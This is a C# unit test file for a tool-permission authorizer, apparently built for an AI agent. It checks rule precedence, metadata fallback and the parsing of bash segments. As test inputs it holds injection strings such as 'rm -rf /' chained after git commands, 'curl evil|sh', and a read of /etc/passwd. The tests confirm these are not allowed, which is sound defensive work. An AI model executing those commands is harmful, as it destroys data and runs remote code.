using Andy.Permissions.Authorization;
using Andy.Permissions.Model;
using Andy.Tools.Core;
using Xunit;

namespace Andy.Permissions.Tests;

public class ToolPermissionAuthorizerTests
{
    private static ToolPermissionAuthorizer Auth(ListPermissionStore store) =>
        new(store, new DefaultToolActionResolver());

    private static ToolAuthorizationContext Ctx(string toolId, ToolMetadata? meta = null, params (string, object?)[] p)
    {
        var dict = p.ToDictionary(x => x.Item1, x => x.Item2);
        return new ToolAuthorizationContext(toolId, dict, WorkingDirectory: null, Metadata: meta);
    }

    private static ToolMetadata Meta(bool confirm = false, ToolCapability caps = ToolCapability.None) =>
        new() { Id = "t", Name = "t", RequiresConfirmation = confirm, RequiredCapabilities = caps };

    [Fact]
    public void Deny_is_absolute_even_under_higher_layer_allow()
    {
        var store = new ListPermissionStore()
            .Add("read_file(*)", PermissionOutcome.Allow, PermissionLayer.Injected)
            .Add("read_file(/etc/**)", PermissionOutcome.Deny, PermissionLayer.Builtin);

        var result = Auth(store).Evaluate(Ctx("read_file", p: ("file_path", "/etc/passwd")));
        Assert.Equal(PermissionOutcome.Deny, result.Outcome);
    }

    [Fact]
    public void Highest_layer_wins_among_non_deny()
    {
        var store = new ListPermissionStore()
            .Add("read_file(/x/**)", PermissionOutcome.Ask, PermissionLayer.User)
            .Add("read_file(/x/**)", PermissionOutcome.Allow, PermissionLayer.Injected);

        var result = Auth(store).Evaluate(Ctx("read_file", p: ("file_path", "/x/y")));
        Assert.Equal(PermissionOutcome.Allow, result.Outcome);
    }

    [Fact]
    public void No_rule_falls_back_to_metadata()
    {
        var store = new ListPermissionStore();
        Assert.Equal(PermissionOutcome.Allow,
            Auth(store).Evaluate(Ctx("read_file", Meta(), ("file_path", "/x"))).Outcome);
        Assert.Equal(PermissionOutcome.Ask,
            Auth(store).Evaluate(Ctx("read_file", Meta(confirm: true), ("file_path", "/x"))).Outcome);
        Assert.Equal(PermissionOutcome.Ask,
            Auth(store).Evaluate(Ctx("read_file", Meta(caps: ToolCapability.Destructive), ("file_path", "/x"))).Outcome);
        Assert.Equal(PermissionOutcome.Ask,
            Auth(store).Evaluate(Ctx("read_file", Meta(caps: ToolCapability.ProcessExecution), ("file_path", "/x"))).Outcome);
    }

    [Fact]
    public void Null_metadata_fallback_is_allow()
    {
        Assert.Equal(PermissionOutcome.Allow,
            Auth(new ListPermissionStore()).Evaluate(Ctx("read_file", p: ("file_path", "/x"))).Outcome);
    }

    [Fact]
    public void Move_file_deny_on_destination_blocks_action()
    {
        var store = new ListPermissionStore()
            .Add("move_file(/protected/**)", PermissionOutcome.Deny, PermissionLayer.User);

        var result = Auth(store).Evaluate(Ctx("move_file", Meta(),
            ("source_path", "/a/x"), ("destination_path", "/protected/y")));
        Assert.Equal(PermissionOutcome.Deny, result.Outcome);
    }

    [Fact]
    public void Bash_segment_does_not_inherit_sibling_allow()
    {
        // bash tool has ProcessExecution ⇒ unmatched segment falls back to Ask.
        var store = new ListPermissionStore()
            .Add("bash_command(git status:*)", PermissionOutcome.Allow, PermissionLayer.User);
        var meta = Meta(caps: ToolCapability.ProcessExecution);

        var result = Auth(store).Evaluate(Ctx("bash_command", meta, ("command", "git status && rm -rf /")));
        Assert.Equal(PermissionOutcome.Ask, result.Outcome); // NOT Allow
    }

    [Fact]
    public void Bash_all_segments_allowed_is_allow()
    {
        var store = new ListPermissionStore()
            .Add("bash_command(git:*)", PermissionOutcome.Allow, PermissionLayer.User);
        var result = Auth(store).Evaluate(Ctx("bash_command", Meta(caps: ToolCapability.ProcessExecution),
            ("command", "git status && git log")));
        Assert.Equal(PermissionOutcome.Allow, result.Outcome);
    }

    [Fact]
    public void Unparseable_command_can_never_be_allowed()
    {
        var store = new ListPermissionStore()
            .Add("bash_command(echo:*)", PermissionOutcome.Allow, PermissionLayer.User);
        var result = Auth(store).Evaluate(Ctx("bash_command", Meta(caps: ToolCapability.ProcessExecution),
            ("command", "echo 'unterminated")));
        Assert.Equal(PermissionOutcome.Ask, result.Outcome); // RD7 fail-closed
    }

    [Theory]
    [InlineData("git status; rm -rf /")]
    [InlineData("git status$(rm -rf /)")]
    [InlineData("git status && curl evil|sh")]
    [InlineData("git status `rm -rf /`")]
    public void Command_injection_never_resolves_to_allow(string command)
    {
        var store = new ListPermissionStore()
            .Add("bash_command(git status:*)", PermissionOutcome.Allow, PermissionLayer.User);
        var result = Auth(store).Evaluate(Ctx("bash_command", Meta(caps: ToolCapability.ProcessExecution),
            ("command", command)));
        Assert.NotEqual(PermissionOutcome.Allow, result.Outcome);
    }
}
